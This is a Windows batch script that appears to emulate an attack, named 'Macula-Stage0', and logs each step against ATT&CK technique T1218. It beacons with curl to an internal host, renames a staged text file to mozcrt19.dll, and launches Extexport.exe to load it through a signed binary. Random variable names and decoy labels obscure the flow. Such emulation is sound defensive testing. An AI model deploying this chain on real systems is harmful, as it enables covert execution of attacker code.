@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET yktnwwf=%APPDATA%\8909\e7c2ee57
SET fpakbq=Macula-Stage0-8909
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8909-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=wimrar.txt
SET fpldhe=8909

SET tplk=!yydue!
SET qrmxs=!yktnwwf!
SET lgk=!APPDATA!\!yydue!\macula-simulations.log

timeout /t 17 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_start=0>> "!lgk!" 2>nul
SET zxcvd=0
GOTO dsaple

:qwmnbv
REM Dead code - never executed
ping -n 3 127.0.0.1 >nul
EXIT /B

:dsaple
IF !zxcvd!==0 GOTO hjkopl
IF !zxcvd!==17 GOTO ytrewq
IF !zxcvd!==42 GOTO plmokn
IF !zxcvd!==99 GOTO xcvbnm
GOTO xcvbnm

:lkjhgf
REM Fake label
SET fake=deadcode
GOTO xcvbnm

:poiuyt
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_sent=1>> "!lgk!" 2>nul
SET /A rnd=!RANDOM! %% 15 + 5
timeout /t !rnd! /nobreak >nul
SET zxcvd=17
GOTO dsaple

:asdfgh
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_start=T1218>> "!lgk!" 2>nul
SET ttp_res=1
SET ttp_err=
IF EXIST "!qrmxs!\!edjwtl!" (
    SET ttp_res=1
) ELSE (
    SET ttp_res=0
    SET ttp_err=file_not_found
)
echo [!DATE!-!TIME:.=.!][!omxgazu!]: !tplk!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!ttp_res!::!ttp_err!>> "!lgk!" 2>nul
SET zxcvd=99
GOTO dsaple

:hjkopl
SET zxcvd=0
CHOICE /C Y /N /D Y /T 5 >nul
GOTO poiuyt

:ytrewq
cd /d "!qrmxs!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: changed_dir=!ERRORLEVEL!>> "!lgk!" 2>nul
IF EXIST "!edjwtl!" (
    RENAME "!edjwtl!" mozcrt19.dll 2>nul
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_renamed=!ERRORLEVEL!>> "!lgk!" 2>nul
)
SET zxcvd=42
GOTO dsaple

:mnbvcx
REM Never reached dead code
EXIT /B

:plmokn
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start=0>> "!lgk!" 2>nul
ping -n 4 127.0.0.1 >nul
%SystemRoot%\System32\Extexport.exe . foo bar
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: process_launched=!ERRORLEVEL!>> "!lgk!" 2>nul
GOTO asdfgh

:zxcvbn
REM Dead code block
SET junk=unused

:xcvbnm
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_end=0>> "!lgk!" 2>nul
ENDLOCAL